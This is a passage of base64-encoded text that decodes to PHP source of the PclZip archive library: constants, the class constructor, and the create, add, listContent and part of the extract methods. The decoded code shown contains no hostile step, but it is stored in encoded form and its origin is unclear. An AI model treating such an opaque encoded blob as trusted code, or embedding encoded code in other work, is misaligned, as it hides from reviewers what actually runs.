X0FfRElSRUNUT1JZJywgLTE3ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0NPTVBSRVNTSU9OJywgLTE4ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0VOQ1JZUFRJT04nLCAtMTkgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfSU5WQUxJRF9BVFRSSUJVVEVfVkFMVUUnLCAtMjAgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfRElSRUNUT1JZX1JFU1RSSUNUSU9OJywgLTIxICk7DQoNCmRlZmluZSggJ1BDTFpJUF9PUFRfUEFUSCcsIDc3MDAxICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0FERF9QQVRIJywgNzcwMDIgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEgnLCA3NzAwMyApOw0KZGVmaW5lKCAnUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEgnLCA3NzAwNCApOw0KZGVmaW5lKCAnUENMWklQX09QVF9TRVRfQ0hNT0QnLCA3NzAwNSApOw0KZGVmaW5lKCAnUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklORycsIDc3MDA2ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX05PX0NPTVBSRVNTSU9OJywgNzcwMDcgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfQllfTkFNRScsIDc3MDA4ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0JZX0lOREVYJywgNzcwMDkgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfQllfRVJFRycsIDc3MDEwICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX0JZX1BSRUcnLCA3NzAxMSApOw0KZGVmaW5lKCAnUENMWklQX09QVF9DT01NRU5UJywgNzcwMTIgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfQUREX0NPTU1FTlQnLCA3NzAxMyApOw0KZGVmaW5lKCAnUENMWklQX09QVF9QUkVQRU5EX0NPTU1FTlQnLCA3NzAxNCApOw0KZGVmaW5lKCAnUENMWklQX09QVF9FWFRSQUNUX0lOX09VVFBVVCcsIDc3MDE1ICk7DQpkZWZpbmUoICdQQ0xaSVBfT1BUX1JFUExBQ0VfTkVXRVInLCA3NzAxNiApOw0KZGVmaW5lKCAnUENMWklQX09QVF9TVE9QX09OX0VSUk9SJywgNzcwMTcgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfRVhUUkFDVF9ESVJfUkVTVFJJQ1RJT04nLCA3NzAxOSApOw0KZGVmaW5lKCAnUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEJywgNzcwMjAgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX09OJywgNzcwMjEgKTsNCmRlZmluZSggJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRicsIDc3MDIyICk7DQoNCmRlZmluZSggJ1BDTFpJUF9BVFRfRklMRV9OQU1FJywgNzkwMDEgKTsNCmRlZmluZSggJ1BDTFpJUF9BVFRfRklMRV9ORVdfU0hPUlRfTkFNRScsIDc5MDAyICk7DQpkZWZpbmUoICdQQ0xaSVBfQVRUX0ZJTEVfTkVXX0ZVTExfTkFNRScsIDc5MDAzICk7DQpkZWZpbmUoICdQQ0xaSVBfQVRUX0ZJTEVfTVRJTUUnLCA3OTAwNCApOw0KZGVmaW5lKCAnUENMWklQX0FUVF9GSUxFX0NPTlRFTlQnLCA3OTAwNSApOw0KZGVmaW5lKCAnUENMWklQX0FUVF9GSUxFX0NPTU1FTlQnLCA3OTAwNiApOw0KDQpkZWZpbmUoICdQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1QnLCA3ODAwMSApOw0KZGVmaW5lKCAnUENMWklQX0NCX1BPU1RfRVhUUkFDVCcsIDc4MDAyICk7DQpkZWZpbmUoICdQQ0xaSVBfQ0JfUFJFX0FERCcsIDc4MDAzICk7DQpkZWZpbmUoICdQQ0xaSVBfQ0JfUE9TVF9BREQnLCA3ODAwNCApOw0KDQpjbGFzcyBQY2xaaXANCnsNCiAgdmFyICR6aXBuYW1lID0gJyc7DQoNCiAgdmFyICR6aXBfZmQgPSAwOw0KDQogIHZhciAkZXJyb3JfY29kZSA9IDE7DQogIHZhciAkZXJyb3Jfc3RyaW5nID0gJyc7DQogIA0KICB2YXIgJG1hZ2ljX3F1b3Rlc19zdGF0dXM7DQoNCmZ1bmN0aW9uIFBjbFppcCgkcF96aXBuYW1lKQ0Kew0KDQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCdnem9wZW4nKSkNCiAgew0KICAgIGRpZSgnQWJvcnQgJy5iYXNlbmFtZShfX0ZJTEVfXykuJyA6IE1pc3NpbmcgemxpYiBleHRlbnNpb25zJyk7DQogIH0NCg0KICAkdGhpcy0+emlwbmFtZSA9ICRwX3ppcG5hbWU7DQogICR0aGlzLT56aXBfZmQgPSAwOw0KICAkdGhpcy0+bWFnaWNfcXVvdGVzX3N0YXR1cyA9IC0xOw0KDQogIHJldHVybjsNCn0NCg0KZnVuY3Rpb24gY3JlYXRlKCRwX2ZpbGVsaXN0KQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICAkdl9vcHRpb25zID0gYXJyYXkoKTsNCiAgJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX05PX0NPTVBSRVNTSU9OXSA9IEZBTFNFOw0KDQogICR2X3NpemUgPSBmdW5jX251bV9hcmdzKCk7DQoNCiAgaWYgKCR2X3NpemUgPiAxKSB7DQogICAgJHZfYXJnX2xpc3QgPSBmdW5jX2dldF9hcmdzKCk7DQoNCiAgICBhcnJheV9zaGlmdCgkdl9hcmdfbGlzdCk7DQogICAgJHZfc2l6ZS0tOw0KDQogICAgaWYgKChpc19pbnRlZ2VyKCR2X2FyZ19saXN0WzBdKSkgJiYgKCR2X2FyZ19saXN0WzBdID4gNzcwMDApKSB7DQoNCiAgICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UGFyc2VPcHRpb25zKCR2X2FyZ19saXN0LCAkdl9zaXplLCAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkgKFBDTFpJUF9PUFRfUkVNT1ZFX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQUREX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfQ0JfUFJFX0FERCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9DQl9QT1NUX0FERCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT04gPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0NPTU1FTlQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTEQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKSk7DQogICAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KDQogICAgZWxzZSB7DQoNCiAgICAgICR2X29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF0gPSAkdl9hcmdfbGlzdFswXTsNCg0KICAgICAgaWYgKCR2X3NpemUgPT0gMikgew0KICAgICAgICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEhdID0gJHZfYXJnX2xpc3RbMV07DQogICAgICB9DQogICAgICBlbHNlIGlmICgkdl9zaXplID4gMikgew0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLA0KCSAgICAgICAgICAgICAgICAgICAgICAgIkludmFsaWQgbnVtYmVyIC8gdHlwZSBvZiBhcmd1bWVudHMiKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KICB9DQogIA0KICAkdGhpcy0+cHJpdk9wdGlvbkRlZmF1bHRUaHJlc2hvbGQoJHZfb3B0aW9ucyk7DQoNCiAgJHZfc3RyaW5nX2xpc3QgPSBhcnJheSgpOw0KICAkdl9hdHRfbGlzdCA9IGFycmF5KCk7DQogICR2X2ZpbGVkZXNjcl9saXN0ID0gYXJyYXkoKTsNCiAgJHBfcmVzdWx0X2xpc3QgPSBhcnJheSgpOw0KICANCiAgaWYgKGlzX2FycmF5KCRwX2ZpbGVsaXN0KSkgew0KICANCiAgICBpZiAoaXNzZXQoJHBfZmlsZWxpc3RbMF0pICYmIGlzX2FycmF5KCRwX2ZpbGVsaXN0WzBdKSkgew0KICAgICAgJHZfYXR0X2xpc3QgPSAkcF9maWxlbGlzdDsNCiAgICB9DQogICAgDQogICAgZWxzZSB7DQogICAgICAkdl9zdHJpbmdfbGlzdCA9ICRwX2ZpbGVsaXN0Ow0KICAgIH0NCiAgfQ0KDQogIGVsc2UgaWYgKGlzX3N0cmluZygkcF9maWxlbGlzdCkpIHsNCiAgICAkdl9zdHJpbmdfbGlzdCA9IGV4cGxvZGUoUENMWklQX1NFUEFSQVRPUiwgJHBfZmlsZWxpc3QpOw0KICB9DQoNCiAgZWxzZSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgdmFyaWFibGUgdHlwZSBwX2ZpbGVsaXN0Iik7DQogICAgcmV0dXJuIDA7DQogIH0NCiAgDQogIGlmIChzaXplb2YoJHZfc3RyaW5nX2xpc3QpICE9IDApIHsNCiAgICBmb3JlYWNoICgkdl9zdHJpbmdfbGlzdCBhcyAkdl9zdHJpbmcpIHsNCiAgICAgIGlmICgkdl9zdHJpbmcgIT0gJycpIHsNCiAgICAgICAgJHZfYXR0X2xpc3RbXVtQQ0xaSVBfQVRUX0ZJTEVfTkFNRV0gPSAkdl9zdHJpbmc7DQogICAgICB9DQogICAgICBlbHNlIHsNCiAgICAgIH0NCiAgICB9DQogIH0NCiAgDQogICR2X3N1cHBvcnRlZF9hdHRyaWJ1dGVzDQogID0gYXJyYXkgKCBQQ0xaSVBfQVRUX0ZJTEVfTkFNRSA9PiAnbWFuZGF0b3J5Jw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX05FV19TSE9SVF9OQU1FID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9ORVdfRlVMTF9OQU1FID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9NVElNRSA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfQ09OVEVOVCA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfQ09NTUVOVCA9PiAnb3B0aW9uYWwnDQoJCQkJCSk7DQogIGZvcmVhY2ggKCR2X2F0dF9saXN0IGFzICR2X2VudHJ5KSB7DQogICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZGaWxlRGVzY3JQYXJzZUF0dCgkdl9lbnRyeSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X2ZpbGVkZXNjcl9saXN0W10sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfc3VwcG9ydGVkX2F0dHJpYnV0ZXMpOw0KICAgIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICB9DQoNCiAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZGaWxlRGVzY3JFeHBhbmQoJHZfZmlsZWRlc2NyX2xpc3QsICR2X29wdGlvbnMpOw0KICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICByZXR1cm4gMDsNCiAgfQ0KDQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2Q3JlYXRlKCR2X2ZpbGVkZXNjcl9saXN0LCAkcF9yZXN1bHRfbGlzdCwgJHZfb3B0aW9ucyk7DQogIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgIHJldHVybiAwOw0KICB9DQoNCiAgcmV0dXJuICRwX3Jlc3VsdF9saXN0Ow0KfQ0KDQpmdW5jdGlvbiBhZGQoJHBfZmlsZWxpc3QpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogICR2X29wdGlvbnMgPSBhcnJheSgpOw0KICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT05dID0gRkFMU0U7DQoNCiAgJHZfc2l6ZSA9IGZ1bmNfbnVtX2FyZ3MoKTsNCg0KICBpZiAoJHZfc2l6ZSA+IDEpIHsNCiAgICAkdl9hcmdfbGlzdCA9IGZ1bmNfZ2V0X2FyZ3MoKTsNCg0KICAgIGFycmF5X3NoaWZ0KCR2X2FyZ19saXN0KTsNCiAgICAkdl9zaXplLS07DQoNCiAgICBpZiAoKGlzX2ludGVnZXIoJHZfYXJnX2xpc3RbMF0pKSAmJiAoJHZfYXJnX2xpc3RbMF0gPiA3NzAwMCkpIHsNCg0KICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZQYXJzZU9wdGlvbnMoJHZfYXJnX2xpc3QsICR2X3NpemUsICR2X29wdGlvbnMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcnJheSAoUENMWklQX09QVF9SRU1PVkVfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9BRERfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9DQl9QUkVfQUREID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BPU1RfQUREID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9OT19DT01QUkVTU0lPTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQ09NTUVOVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQUREX0NPTU1FTlQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1BSRVBFTkRfQ09NTUVOVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09OID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCgkJCQkJCQkJCQkJICAgKSk7DQogICAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KDQogICAgZWxzZSB7DQoNCiAgICAgICR2X29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF0gPSAkdl9hZGRfcGF0aCA9ICR2X2FyZ19saXN0WzBdOw0KDQogICAgICBpZiAoJHZfc2l6ZSA9PSAyKSB7DQogICAgICAgICR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF0gPSAkdl9hcmdfbGlzdFsxXTsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKCR2X3NpemUgPiAyKSB7DQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIG51bWJlciAvIHR5cGUgb2YgYXJndW1lbnRzIik7DQoNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgJHRoaXMtPnByaXZPcHRpb25EZWZhdWx0VGhyZXNob2xkKCR2X29wdGlvbnMpOw0KDQogICR2X3N0cmluZ19saXN0ID0gYXJyYXkoKTsNCiAgJHZfYXR0X2xpc3QgPSBhcnJheSgpOw0KICAkdl9maWxlZGVzY3JfbGlzdCA9IGFycmF5KCk7DQogICRwX3Jlc3VsdF9saXN0ID0gYXJyYXkoKTsNCiAgDQogIGlmIChpc19hcnJheSgkcF9maWxlbGlzdCkpIHsNCiAgDQogICAgaWYgKGlzc2V0KCRwX2ZpbGVsaXN0WzBdKSAmJiBpc19hcnJheSgkcF9maWxlbGlzdFswXSkpIHsNCiAgICAgICR2X2F0dF9saXN0ID0gJHBfZmlsZWxpc3Q7DQogICAgfQ0KICAgIA0KICAgIGVsc2Ugew0KICAgICAgJHZfc3RyaW5nX2xpc3QgPSAkcF9maWxlbGlzdDsNCiAgICB9DQogIH0NCg0KICBlbHNlIGlmIChpc19zdHJpbmcoJHBfZmlsZWxpc3QpKSB7DQogICAgJHZfc3RyaW5nX2xpc3QgPSBleHBsb2RlKFBDTFpJUF9TRVBBUkFUT1IsICRwX2ZpbGVsaXN0KTsNCiAgfQ0KDQogIGVsc2Ugew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIHZhcmlhYmxlIHR5cGUgJyIuZ2V0dHlwZSgkcF9maWxlbGlzdCkuIicgZm9yIHBfZmlsZWxpc3QiKTsNCiAgICByZXR1cm4gMDsNCiAgfQ0KICANCiAgaWYgKHNpemVvZigkdl9zdHJpbmdfbGlzdCkgIT0gMCkgew0KICAgIGZvcmVhY2ggKCR2X3N0cmluZ19saXN0IGFzICR2X3N0cmluZykgew0KICAgICAgJHZfYXR0X2xpc3RbXVtQQ0xaSVBfQVRUX0ZJTEVfTkFNRV0gPSAkdl9zdHJpbmc7DQogICAgfQ0KICB9DQogIA0KICAkdl9zdXBwb3J0ZWRfYXR0cmlidXRlcw0KICA9IGFycmF5ICggUENMWklQX0FUVF9GSUxFX05BTUUgPT4gJ21hbmRhdG9yeScNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9ORVdfU0hPUlRfTkFNRSA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfTkVXX0ZVTExfTkFNRSA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfTVRJTUUgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX0NPTlRFTlQgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX0NPTU1FTlQgPT4gJ29wdGlvbmFsJw0KCQkJCQkpOw0KICBmb3JlYWNoICgkdl9hdHRfbGlzdCBhcyAkdl9lbnRyeSkgew0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RmlsZURlc2NyUGFyc2VBdHQoJHZfZW50cnksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9maWxlZGVzY3JfbGlzdFtdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfb3B0aW9ucywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X3N1cHBvcnRlZF9hdHRyaWJ1dGVzKTsNCiAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgfQ0KDQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RmlsZURlc2NyRXhwYW5kKCR2X2ZpbGVkZXNjcl9saXN0LCAkdl9vcHRpb25zKTsNCiAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgcmV0dXJuIDA7DQogIH0NCg0KICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZCgkdl9maWxlZGVzY3JfbGlzdCwgJHBfcmVzdWx0X2xpc3QsICR2X29wdGlvbnMpOw0KICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICByZXR1cm4gMDsNCiAgfQ0KDQogIHJldHVybiAkcF9yZXN1bHRfbGlzdDsNCn0NCg0KZnVuY3Rpb24gbGlzdENvbnRlbnQoKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICBpZiAoISR0aGlzLT5wcml2Q2hlY2tGb3JtYXQoKSkgew0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogICRwX2xpc3QgPSBhcnJheSgpOw0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2TGlzdCgkcF9saXN0KSkgIT0gMSkNCiAgew0KICAgIHVuc2V0KCRwX2xpc3QpOw0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogIHJldHVybiAkcF9saXN0Ow0KfQ0KDQpmdW5jdGlvbiBleHRyYWN0KCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHRoaXMtPnByaXZFcnJvclJlc2V0KCk7DQoNCiAgaWYgKCEkdGhpcy0+cHJpdkNoZWNrRm9ybWF0KCkpIHsNCiAgICByZXR1cm4oMCk7DQogIH0NCg0KICAkdl9vcHRpb25zID0gYXJyYXkoKTsNCiAgJHZfcGF0aCA9ICcnOw0KICAkdl9yZW1vdmVfcGF0aCA9ICIiOw0KICAkdl9yZW1vdmVfYWxsX3BhdGggPSBmYWxzZTsNCg0KICAkdl9zaXplID0gZnVuY19udW1fYXJncygpOw0KDQogICR2X29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklOR10gPSBGQUxTRTsNCg0KICBpZiAoJHZfc2l6ZSA+IDApIHsNCiAgICAkdl9hcmdfbGlzdCA9IGZ1bmNfZ2V0X2FyZ3MoKTsNCg0KICAgIGlmICgoaXNfaW50ZWdlcigkdl9hcmdfbGlzdFswXSkpICYmICgkdl9hcmdfbGlzdFswXSA+IDc3MDAwKSkgew0KDQogICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlBhcnNlT3B0aW9ucygkdl9hcmdfbGlzdCwgJHZfc2l6ZSwgJHZfb3B0aW9ucywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5IChQQ0xaSVBfT1BUX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0FERF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BSRV9FWFRSQUNUID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BPU1RfRVhUUkFDVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfU0VUX0NITU9EID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9OQU1FID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9FUkVHID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9QUkVHID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9JTkRFWCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkcgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0VYVFJBQ1RfSU5fT1VUUFVUID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRVBMQUNFX05FV0VSID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsUENMWklQX09QVF9TVE9QX09OX0VSUk9SID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09OID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGID0+ICdvcHRpb25hbCcNCgkJCQkJCQkJCQkJICAgICkpOw0KICAgICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KDQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1BBVEhdKSkgew0KICAgICAgICAkdl9wYXRoID0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1BBVEhdOw0KICAgICAgfQ0KICAgICAgaWYgKGlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF0pKSB7DQogICAgICAgICR2X3JlbW92ZV9wYXRoID0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIXTsNCiAgICAgIH0NCiAgICAgIGlmIChpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpIHsNCiAgICAgICAgJHZfcmVtb3ZlX2FsbF9wYXRoID0gJHZfb3B